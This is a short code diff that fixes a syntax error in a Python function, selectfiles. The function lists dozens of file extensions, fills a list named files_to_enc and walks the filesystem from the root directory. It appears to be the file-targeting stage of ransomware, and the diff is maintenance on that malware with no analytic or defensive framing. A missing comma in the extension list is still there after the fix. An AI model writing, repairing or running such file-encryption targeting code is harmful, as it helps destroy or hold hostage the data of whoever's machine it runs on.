@@ -77,7 +77,7 @@ def selectfiles():
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
            ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
            ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
-           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt]
+           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt"]
            
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
